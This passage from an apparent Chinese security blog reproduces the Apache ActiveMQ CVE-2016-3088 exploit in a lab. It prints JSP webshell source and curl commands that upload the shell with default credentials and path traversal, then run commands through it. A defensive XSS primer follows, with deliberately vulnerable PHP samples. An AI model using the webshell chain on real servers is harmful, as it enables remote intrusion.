显示内存信息           | 如内存范围、内存权限等。    |\n\n \n\n###  WinDbg插件使用\n\nWindbg也支持插件，winxp和winext是插件的默认搜索目录，插件要放在windbg根目录或插件文件夹中，加载后可以用命令“!插件名.help”来查看帮助，“!导出函数”来使用功能。加载插件用.load（直接使用!ext.xxx的方式也能加载ext插件），卸载用.unload，使用.chain能清晰看到当前加载的插件和搜索目录。\n\n| 插件名称                                                     | 主要功能                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| [AddSym](https://tuts4you.com/download.php?view.3564)        | 允许在IDA和WinDBG之间传输符号名称                            |\n| [CmdHist](http://www.osronline.com/article.cfm?article=547)  | 记录您在调试会话中执行的每个命令，以便您可以轻松地重新执行   |\n| [narly](https://code.google.com/p/narly/)                    | 列出了有关加载模块的信息，如使用SafeSEH，ASLR，DEP，/ GS(缓冲区安全检查) |\n| [PyKD](http://pykd.codeplex.com/)                            | 允许Python用于脚本WinDBG                                     |\n| [windbgshark](https://code.google.com/p/windbgshark/)        | 集成Wireshark协议分析器，以实现VM流量操纵和分析              |\n| [MSEC](http://msecdbg.codeplex.com/)                         | 提供自动崩溃分析和安全风险评估                               |\n| [Mona](http://redmine.corelan.be/projects/mona)(需要PyKD)    | 帮助高级分析/查找漏洞的命令集                                |\n| [Core Analyzer](http://core-analyzer.sourceforge.net/index_files/Page335.html) | 检查堆结构是否损坏，检测线程共享的对象等                     |","tags":["个人总结"],"categories":["二进制"]},{"title":"Apache ActiveMQ Fileserver漏洞组合复现","url":"/2021/01/25/Apache ActiveMQ Fileserver漏洞复现/","content":"\n目前网上的复现CVE-2016-3088方法基本固定：编写shell、上传到fileserver文件夹、利用move指令移到可以利用的地方，其中还需要爆出存放路径。\n\n本文将该漏洞与CVE-2015-1830目录遍历相结合，利用curl完成全部利用过程。\n\n<!-- more -->\n\n#### 1. 背景概述\n\nActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。\n\n2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。\n\n#### 2.漏洞环境搭建\n\n1、官网下载apache-activemq-5.11.1-bin.tar 下载地址:http://activemq.apache.org/download-archives.html\n\n2、解压\n\n3、启动,进入bin目录下,运行./activemq start　![截屏2020-02-02下午12.57.58](https://tva1.sinaimg.cn/large/006tNbRwly1gbhyvc5764j30y10ki439.jpg)\n\n4、浏览器访问http://127.0.0.1:8186,如下图可以看到成功搭建环境\n\n![截屏2020-02-02下午12.58.46](https://tva1.sinaimg.cn/large/006tNbRwly1gbhywqv2l0j30y10kiq7g.jpg)\n\n#### 3.知道创宇404实验室的复现方法（该部分摘自404实验室博客原文）\n\n首先 PUT 一个 Jsp 的 Webshell 到 fileserver 目录\n\n![img](https://tva1.sinaimg.cn/large/006tNbRwly1gbhyyd6pv6j30nr09374k.jpg)\n\n在 fileserver/ 目录中 Webshell 并没有执行权限\n\n![img](https://tva1.sinaimg.cn/large/006tNbRwly1gbhyycen6hj30r804l74p.jpg)\n\n利用该版本存在物理路径泄露漏洞,爆一下绝对路径\n\n![img](https://tva1.sinaimg.cn/large/006tNbRwly1gbhyye3hzhj310803x0ss.jpg)\n\n这一步也可以利用默认的ActiveMQ帐户和密码为`admin`，访问`http://your-ip:8161/admin/test/systemProperties.jsp`以查看ActiveMQ的绝对路径：\n\n![截屏2020-02-02下午1.07.12](https://tva1.sinaimg.cn/large/006tNbRwgy1gbhz5050c6j31bb0u0ql8.jpg)\n\n然后利用 MOVE 方法将 Webshell 移入 admin/ 目录（也可以利用相对路径）\n\n![img](https://tva1.sinaimg.cn/large/006tNbRwly1gbhyycmywvj30sf04edfv.jpg)\n\n访问http://localhost:8161/admin/1.jsp?cmd=ls ，命令成功执行，效果如下\n\n![img](https://tva1.sinaimg.cn/large/006tNbRwly1gbhyydn04gj30m80dg75v.jpg)\n\n#### 4.我的复现过程\n\n1.首先编写一个cmd.js，内容主要如下：\n\n```jsp\n<%@ page import=\"java.util.*,java.io.*\"%>  \n <%  \n %>  \n <HTML><BODY>  \n Commands with JSP  \n <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">  \n <INPUT TYPE=\"text\" NAME=\"cmd\">  \n <INPUT TYPE=\"submit\" VALUE=\"Send\">  \n </FORM>  \n <pre>  \n <%  \n if (request.getParameter(\"cmd\") != null) {  \n out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");  \n Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));  \n OutputStream os = p.getOutputStream();  \n InputStream in = p.getInputStream();  \n DataInputStream dis = new DataInputStream(in);  \n String disr = dis.readLine();  \n while ( disr != null ) {  \n out.println(disr);  \n disr = dis.readLine();  \n }  \n }  \n %>  \n </pre>  \n </BODY></HTML>  \n```\n\n将其放置在cmd的默认路径下，默认一般是：C:\\Users\\用户名 或者C:\\Users\\admin\n\n![截屏2020-02-02下午1.25.39](https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzo65f57j30la0dwwgv.jpg)\n\n打开cmd，利用\"..\\”的便利目录漏洞，输入如下命令\n\n```shell\ncurl -u admin:admin -v -X PUT --data \"@cmd.jsp\" http://TARGET:8161/fileserver/..\\\\admin\\\\cmd.jsp\n```\n\n两个admin是默认的服务用户名和密码\n\n该条命令直接把cmd.jsp上传到admin的目录下\n\n![截屏2020-02-02下午1.30.30](https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzt9c2zlj30la0dwaco.jpg)\n\n在cmd中利用curl用GET直接利用命令：\n\n```shell\ncurl -u admin:admin -v -X GET http://TARGET:8161/admin/cmd.jsp?cmd=calc.exe\n```\n\n![截屏2020-02-02下午1.34.00](https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzx6nio1j30la0dwjtm.jpg)\n\n可以看到成功弹出计算器，利用成功","tags":["漏洞复现"],"categories":["web"]},{"title":"跨站脚本攻击（XSS）知识点","url":"/2021/01/25/XSS的学习与总结/","content":"\n**概述**：跨站点脚本（XSS）是Web应用程序中常见的一种安全漏洞。XSS使攻击者能够将客户端脚本注入其他用户查看的网页中。攻击者可以利用跨站点脚本漏洞绕过访问控制，如同源策略。在2007 年之前，赛门铁克（Symantec）报告的网站中所含XSS漏洞占据了所有安全漏洞的大约84％。直到现在，XSS仍然被认为是主要的威胁载体之一。XSS效果的范围从轻微的小麻烦到重大的安全风险，主要取决于受攻击站点对数据的敏感性设置以及站点管理者实施的安全防御措施。本文将主要就跨站脚本攻击（XSS）的概念、作用、过程，以及应用进行介绍。\n\n<!-- more -->\n\n# XSS的概念及作用\n\n##  基本概念\n\nXSS漏洞的起源可以追溯到1999年末的一个微软安全工程师小组，微软安全响应中心（The Microsoft Security Response Center）和微软浏览器安全团队（the Microsoft Internet Explorer Security Team）收到消息，一些网站受到攻击，脚本和图像标签被恶意注入html页面。并且该攻击本质上是持久的，payload被一次又一次地存储和注入，影响到所有请求该页面的人。后在2006至2013曾任PayPal首席信息安全官的Michael Barrett，反映了在美国运通网页中也发现了类似的问题，并在1999年秋季的一次会议上向微软安全中心团队描述了这个漏洞，12月20日，微软的安全工程师团队正式开始了对该漏洞的研究，并在新千年的二月份发布了一份报告，在本报告中，第一次定义了该种攻击的名称为Cross Site Scripting（XSS）。\n\n大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter，Facebook，MySpace，Orkut ,新浪微博和百度贴吧 。之后几年XSS已经超过[缓冲区溢出](file:////wiki/%25E7%25BC%2593%25E5%2586%25B2%25E5%258C%25BA%25E6%25BA%25A2%25E5%2587%25BA)成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2010年统计数据，在Web安全威胁前10位中，XSS排名第2，仅次于代码注入（Injection）。\n\n![image-20190825085720016](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bn5wyli8j30v80p8qej.jpg)\n\n<center>Figure 1 Web安全攻击方式分布图</center>\nXSS漏洞，通常指的是恶意攻击者利用浏览器的动态展示数据功能，在Web页面里插入恶意脚本代码。当用户浏览该页之时，这些嵌入在HTML页面里面的问题代码会被执行，从而达到恶意的特殊目的。\n\nXSS根据攻击效果的不同，基本可以分为以下几类：\n\n- 反射型XSS（Reflected XSS）：最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中，当受害者请求这样的链接时，跨站代码经过服务端反射回来。这类跨站代码通常不存储到服务端。\n\n- 存储型XSS（Stored  XSS）：此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。\n\n- DOM型XSS（DOM-based XSS）：一种基于DOM的跨站，这是客户端脚本自身解析不正确导致的安全问题。\n\n\n##  XSS的作用（危害）\n\nXSS的危害大小，其实主要取决于攻击者的js水平，这决定了攻击的效果。它对于攻击者的主要作用可以总结如下：\n\n-   盗用cookie，获取敏感信息。\n\n-   利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。\n\n-   利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。\n\n-   利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n\n-   在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现[DDoS](file:////wiki/DDoS)攻击的效果。\n\n如果按照作用对象划分，还可以划为针对用户和针对Web服务两种大类，具体作用可看下图：\n\n![image-20190825090358128](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bncs2ff3j312s0hcdi8.jpg)\n\n<center>Figure 2 XSS的作用图</center>\n```php\n<?php \n// Is there any input? \nif( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) { \n\t// Feedback for end user\n\techo'<pre>Hello '. $_GET[ 'name' ] . '</pre>'; \n} \n?>\n```\n\n\n\n# 常见XSS分析\n\n## 反射型 XSS\n\n反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。\n\n反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。\n\n服务器端代码：\n\n```php\n<?php\n// Is there any input?\nif( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) { \n    // Feedback for end user \n    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; \n} \n?>\n```\n\n可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。\n\n## 持久型 XSS\n\n持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。\n\n此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。\n\n服务器端代码：\n\n```php\n<?php\n  if( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = mysql_real_escape_string( $message );\n    // Sanitize name input\n    $name = mysql_real_escape_string( $name );\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );\n    //mysql_close(); }\n?>\n```\n\n代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。\n\n## DOM XSS\n\n传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。\n\nHTML 代码：\n\n```html\n<html>\n  <head>\n    <title>DOM-XSS test</title>\n  </head>\n  <body>\n    <script>\n      var a=document.URL;\n\t    document.write(a.substring(a.indexOf(\"a=\")+2,a.length));\n    </script>\n  </body>\n</html>\n```\n\n将代码保存在 domXSS.html 中，浏览器访问：\n\n[http://127.0.0.1/domXSS.html?a=\\<script\\>alert(\\'XSS\\')\\</script\\>](http://127.0.0.1/domXSS.html?a=%3cscript%3ealert('XSS')%3c/script%3e)\n\n即可触发 XSS 漏洞。\n\n# 几种XSS攻击方法\n\n##  方法一 反射性XSS攻击流程\n\n1)  黑客向用户发送带有XSS恶意脚本的链接\n\n2)  用户点击了恶意链接，访问了目标服务器。\n\n3)  网站将XSS同正常页面返回到用户浏览器\n\n4)  用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起了请求\n\n5)  黑客从自己搭建的恶意服务器中获取用户提交的信息\n\n![image-20190825091452237](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bno4dvj0j30w00osqa5.jpg)\n\n<center>Figure 3 反射性XSS攻击流程图</center>\n##  方法二 存储型XSS攻击流程\n\n1)  黑客在目标服务器上构造XSS恶意脚本，保存在数据库中\n\n2)  用户在网站登录状态下访问了目标服务器，查看了存在恶意脚本的页面\n\n3)  网站将XSS同正常页面返回到用户浏览器\n\n4)  用户浏览器解析了网页中的XSS恶意代码，向恶意服务器发起请求\n\n5)  黑客从自己搭建的恶意服务器中获取用户提交的信息\n\n![image-20190825091540423](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bnoyd1g2j30wg0p046b.jpg)\n\n<center>Figure 4 存储型XSS攻击流程</center>\n##  方法三 DOM型XSS攻击流程\n\n1)  黑客构造出特殊的 URL，其中包含恶意代码。\n\n2)  用户打开带有恶意代码的 URL。\n\n3)  用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。\n\n4)  恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n\n# XSS防御方法\n\n##  防御方法一 前端输入检查\n\nDOM 型 XSS 攻击，归根结底就是网站前端 JavaScript 代码本身不够严谨，将不可信的数据当作代码执行了。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务资源。\n\n前端在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。\n\n如果用 Vue/React 技术栈，并且不使用 `v-html`或`dangerouslySetInnerHTML` 功能，就在前端 render 阶段避免 `innerHTML`、`outerHTML` 的 XSS 隐患。\n\nDOM 中的内联事件监听器，如 `location、onclick、onerror、onload、onmouseover` 等，`<a>` 标签的 `href` 属性，JavaScript 的 `eval()、setTimeout()、setInterval()` 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。\n\n```js\n<!-- 内联事件监听器中包含恶意代码 -->\n<img onclick=\"UNTRUSTED\" onerror=\"UNTRUSTED\" src=\"data:image/png,\">\n\n<!-- 链接内包含恶意代码 -->\n<a href=\"UNTRUSTED\">1</a>\n\n<script>\n// setTimeout()/setInterval() 中调用恶意代码\nsetTimeout(\"UNTRUSTED\")\nsetInterval(\"UNTRUSTED\")\n\n// location 调用恶意代码\nlocation.href = 'UNTRUSTED'\n\n// eval() 中调用恶意代码\neval(\"UNTRUSTED\")\n</script>\n```\n\n如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。\n\n##  防御方法二 服务器端过滤（转义）\n\nXSS的本质就是\"恶意注入\"，恶意的数据被当成了代码一部分来执行，从而混淆了原本的语义，产生了新的语义。\n\n服务器端过滤指的是对部分输入的数据进行相应的编码转换，这样就会将输入解读为数据而不是XSS，阻碍了漏洞的执行。编码的转换主要包括HTML实体编码和JavaScript编码：\n\n1.  HTMLEncode，就是将字符转换成HTMLEntities，一般会转（`&、\\<、\\>、\\\"、\\'、/`）这6个字符。\n\n2.  JavaScriptEncode，是使用\"`\\`\"对特殊字符进行转义。除数字字母之外，小于127的字符编码使用16进制\"`\\xHH`\"的方式进行编码，大于用unicode（非常严格模式）。\n\n但需要注意的是，并非所有的地方编转义都是有效可行的，总体上它确实可以起到一定的XSS防护作用，但是它并不完善。\n\n \n\n| **XSS安全漏洞所在语句** | **简单转义是否有防护效果** |\n| :---------------------: | :------------------------: |\n|    HTML 标签文字内容    |             有             |\n|       HTML 属性值       |             有             |\n|      CSS 内联样式       |             无             |\n|     内联JavaScript      |             无             |\n|        内联JSON         |             无             |\n|        跳转链接         |             无             |\n\n所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。\n\n例如在工程里，常用的转义库为 `org.owasp.encoder`。以下代码引用自 [org.owasp.encoder 的官方说明](https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FOWASP_Java_Encoder_Project%23tab%3DUse_the_Java_Encoder_Project)。\n\n```html\n<!-- HTML 标签内文字内容 -->\n<div><%= Encode.forHtml(UNTRUSTED) %></div>\n\n<!-- HTML 标签属性值 -->\n<input value=\"<%= Encode.forHtml(UNTRUSTED) %>\" />\n\n<!-- CSS 属性值 -->\n<div style=\"width:<= Encode.forCssString(UNTRUSTED) %>\">\n\n<!-- CSS URL -->\n<div style=\"background:<= Encode.forCssUrl(UNTRUSTED) %>\">\n\n<!-- JavaScript 内联代码块 -->\n<script>\n  var msg = \"<%= Encode.forJavaScript(UNTRUSTED) %>\";\n  alert(msg);\n</script>\n\n<!-- JavaScript 内联代码块内嵌 JSON -->\n<script>\nvar __INITIAL_STATE__ = JSON.parse('<%= Encoder.forJavaScript(data.to_json) %>');\n</script>\n\n<!-- HTML 标签内联监听器 -->\n<button\n  onclick=\"alert('<%= Encode.forJavaScript(UNTRUSTED) %>');\">\n  click me\n</button>\n\n<!-- URL 参数 -->\n<a href=\"/search?value=<%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top\">\n\n<!-- URL 路径 -->\n<a href=\"/page/<%= Encode.forUriComponent(UNTRUSTED) %>\">\n\n<!--\n  URL.\n  注意：要根据项目情况进行过滤，禁止掉 \"javascript:\" 链接、非法 scheme 等\n-->\n<a href='<%=\n  urlValidator.isValid(UNTRUSTED) ?\n    Encode.forHtml(UNTRUSTED) :\n    \"/404\"\n%>'>\n  link\n</a>\n```\n\n可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。开发人员要注意在正确的地方使用正确的编码方式，有时为了防御XSS，在一个地方我们需要联合`HTMLEncode、JavaScriptEncode`进行编码，甚至是叠加，并不是固定一种方式编码。具体在哪种地方使用哪种编转义可以总结如下：\n\n1.  **在HTML标签、属性中输出**------用HTMLEncode\n\n2.  **在script标签中输出**------用JavaScriptEncode\n\n3.  **在事件中输出**------用JavaScriptEncode\n\n> \\<**`a** href=\\\"\\#\\\" onclick=\\\"funcA(\\'\\$var\\')\\\"\\>test\\</**a**\\>`\n\n4.  **在CSS中输出**\n\n用类似`JavaScriptEncode`的方式。将除了字母、数字外的所有字符都编码成十六进制形式\"`\\uHH`。\n\n5.  **在地址中输出**\n\n一般如果变量是整个URL，则先检查变量是否以\"http\"开头（不是则帮忙添加http），保证不会出现伪协议类的XSS攻击。然后再对变量进行URLEncode。（PS：URLEncode会将字符转换成\"%HH\"形式。）\n\n第一、第二两种防御方法综合起来一句话就是：***对输入进行过滤，对输出进行编码***。\n\n##  防御方法三 CSP（Content Security Policy）\n\n与上面的两种防御方法相比，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。\n\n> 严格的 CSP 在 XSS 的防范中可以起到以下的作用：\n\n-   禁止加载外域代码，防止复杂的攻击逻辑。\n\n-   禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。\n\n-   禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。\n\n-   禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。\n\n-   合理使用上报可以及时发现 XSS，利于尽快修复问题。\n\n想要启用CSP主要可以使用两种方式，一种是通过网页的`\\<meta>`标签。\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:\">\n```\n\n在上面代码中，CSP 做了如下配置：\n\n-   脚本：只信任当前域名\n\n-   \\<object\\>标签：不信任任何URL，即不加载任何资源\n\n-   样式表：只信任cdn.example.org和third-party.org\n\n-   框架（frame）：必须使用HTTPS协议加载\n\n-   其他资源：没有限制\n\n这样启用之后，不符合CSP的外部资源都会被阻止加载。\n\n第二种方法，一些现代浏览器也支持通过响应头来定义 CSP。下面我们主要介绍如何通过响应头来使用 CSP：\n\nCSP作为一种安全策略，浏览器对它响应头的兼容性也是随着版本的更迭逐渐扩大的，早期的 Chrome 是通过 X-WebKit-CSP 响应头来支持 CSP 的，而 firefox 和 IE 则支持 X-Content-Security-Policy，Chrome25 和 Firefox23 开始支持标准的 Content-Security-Policy。现有的主流浏览器不同版本号对于CSP响应头的兼容性如下图所示：\n\n![image-20190825093247902](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bo6s320zj31c40p4481.jpg)\n\n要使用 CSP，只需要服务端输出类似这样的响应头就行了：\n\n```html\nContent-Security-Policy: default-src 'self'\n```\n\n在这个响应头之中`default-src` 是 CSP 指令，多个指令之间用英文分号分割；`'self' `是指令值，多个指令值用英文空格分割。\n\n目前，有这些 CSP 指令：\n\n|  **指令**   |  **指令值示例**  |                           **说明**                           |\n| :---------: | :--------------: | :----------------------------------------------------------: |\n| default-src | 'self' cnd.a.com | 定义针对所有类型（js、image、css、web font，ajax 请求，iframe，多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认的。 |\n| script-src  | 'self' js.a.com  |               定义针对 JavaScript 的加载策略。               |\n|  style-src  | 'self' css.a.com |                   定义针对样式的加载策略。                   |\n|   img-src   | 'self' img.a.com |                   定义针对图片的加载策略。                   |\n| connect-src |      'self'      | 针对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。 |\n|  font-src   |    font.a.com    |                  针对 WebFont 的加载策略。                   |\n| object-src  |      'self'      | 针对 <object>、<embed> 或 <applet> 等标签引入的 flash 等插件的加载策略。 |\n|  media-src  |   media.a.com    | 针对 <audio> 或 <video> 等标签引入的 HTML 多媒体的加载策略。 |\n|  frame-src  |      'self'      |                   针对 frame 的加载策略。                    |\n|   sandbox   |   allow-forms    | 对请求的资源启用 sandbox（类似于 iframe 的 sandbox 属性）。  |\n| report-uri  |   /report-uri    | 告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。 |\n\n指令值可以由下面这些内容组成：\n\n  \n\n|             **指令值**              |                **指令示例**                 |                           **说明**                           |\n| :---------------------------------: | :-----------------------------------------: | :----------------------------------------------------------: |\n|                                     |                   img-src                   |                        允许任何内容。                        |\n|               'none'                |               img-src 'none'                |                       不允许任何内容。                       |\n|               'self'                |               img-src 'self'                |      允许来自相同来源的内容（相同的协议、域名和端口）。      |\n|                data:                |                img-src data:                |          允许 data: 协议（如 base64 编码的图片）。           |\n|              www.a.com              |              img-src img.a.com              |                   允许加载指定域名的资源。                   |\n|              *.a.com*               |               img-src .a.com                |               允许加载 a.com 任何子域的资源。                |\n| [https://img.com](https://img.com/) | img-src [https://img.com](https://img.com/) |        允许加载 img.com 的 https 资源（协议需匹配）。        |\n|               https:                |               img-src https:                |                    允许加载 https 资源。                     |\n|           'unsafe-inline'           |         script-src 'unsafe-inline'          | 允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。 |\n|            'unsafe-eval'            |          script-src 'unsafe-eval'           |             允许加载动态 js 代码，例如 eval()。              |\n\n从上面的介绍可以看到，CSP 协议可以控制的内容非常多。而且如果不特别指定 `'unsafe-inline'` 时，页面上所有 inline 样式和脚本都不会执行；不特别指定` 'unsafe-eval'`，页面上不允许使用 new Function，setTimeout，eval 等方式执行动态代码。在限制了页面资源来源之后，被 XSS 的风险确实小不少。\n\n##  防御方法四 X-XSS-Protection\n\nX-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS))时，浏览器将停止加载页面。虽然这些保护在现代浏览器中基本上是不必要的，当网站实施一个强大的CSP来禁用内联的JavaScript (`'unsafe-inline'`)时, 它仍然可以为尚不支持 [CSP](https://developer.mozilla.org/en-US/docs/Glossary/CSP) 的旧版浏览器的用户提供保护。它的浏览器兼容性如下图：\n\n![image-20190825094216611](https://tva1.sinaimg.cn/large/006y8mN6ly1g6bogms4f0j31800jgaf5.jpg)\n\n它的使用语法如下所示：\n\n> X-XSS-Protection: 0\n>\n> X-XSS-Protection: 1\n>\n> X-XSS-Protection: 1; mode=block\n>\n> X-XSS-Protection: 1; report=\\<**reporting-uri**\\>\n>\n> **0**\n>\n> 禁止XSS过滤。\n>\n> **1**\n>\n> 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。\n>\n> **1;mode=block**\n>\n> 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。\n>\n> **1; report=\\<reporting-URI\\>  (Chromium only)**\n>\n> 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。\n\nx-xss-protection头很容易实现，只需要轻微的Web服务器配置的变化。\n\n**在Nginx中启用**\n\n```nginx\nadd_header x-xss-protection \"1; mode=block\" always;\n```\n\n**在Apache中启用**\n\n```php\nheader always set x-xss-protection \"1; mode=block\"\n```\n\n**在IIS上启用**\n\n要在IIS上启用，只需以下代码添加到您网站的Web.config文件中即可。\n\n```php\n<system.webServer>\n    ...\n\n    <httpProtocol>\n        <customHeaders>\n            <add name=\"X-XSS-Protection\" value=\"1; mode=block\" />\n        </customHeaders>\n    </httpProtocol>\n\n    ...\n</system.webServer>\n```\n\n在进行配置之后，还需要检查以确保x-xss-protection头确实已经被启用。以下是一些快速检查的简单方法：\n\n1.  打开Chrome DevTools中的网络选项卡，如果您的站点使用安全标头，它将显示在标题选项卡内。\n\n![image-20190825094437775](https://tva1.sinaimg.cn/large/006y8mN6ly1g6boj2y6bqj31aw0gkth3.jpg)\n\n<center>Figure 5 确保x-xss-protection头已开启</center>\n2.检查安全标头的另一种快速方法是使用的工具[securityheaders.io](https://securityheaders.io/)快速扫描网站。这会根据你的所有安全标头来提供等级，可以看到缺少的内容。\n\n##  防御方法五 XSS防火墙\n\n这种技术目前正处于概念阶段,并没有大范围投入使用,其思路是用js代码来对当前网页进行防护,防止发生XSS行为。而且设计理念也是各有不同。\n\n##  解决方案优劣综合对比\n\n \n\n|   **解决方案**   |                           **优点**                           |                           **缺点**                           |\n| :--------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |\n|   前端输入检查   | 对innerHTML的内容进行检查，对eval中用户输入的参数进行检查，对于使用的JS库（如jquery）以及Flash进行检查，以免使用了存在XSS漏洞的JS库和swf文件。可以减轻服务器压力。 | 仅对DOM型XSS有效，对于其他类型的XSS，可以通过抓包工具绕过。  |\n|   服务器端处理   | 服务器端转义输入的左右尖括号、单双引号等符号，对HTML标签进行编码，这是主流的防御XSS的方法，可有效防御一般的XSS攻击。 |         无法防御部分DomXSS攻击，以及Flash XSS攻击。          |\n|       CSP        | 规范了网页中某个标签所能加载的第三方域，从协议层把一些存在安全隐患的用法默认给去除掉，将同源同域发挥到极致，结合禁止内联脚本的机制，可以有效防御大部分的XSS攻击。 | 需要在服务器端进行配置，而且一旦配置不当，正常的业务也会受到影响。配置不严格又会导致绕过。对于大型的、复杂的网站业务，维护成本较高。 |\n| X-XSS-Protection |       依赖于浏览器的XSS筛选器，仅对部分XSS payload有效       |                 对网站业务有一定程度的影响。                 |\n|     HttpOnly     | 在服务器端做配置,在响应头里对cookie中的session进行httponly标记,被标记的session无法被js读出,因此可以有效防御针对偷取cookie的XSS攻击。 |                只能防御针对cookie的XSS攻击。                 |\n|    XSS防火墙     | 利用前端的JS组件，对网页中的事件进行监控，拦截恶意脚本的运行，进而防止发生XSS行为 |               若前端的JS代码暴露，容易造成绕过               |\n\n\n# XSS相关工具介绍\n\n##  工具一 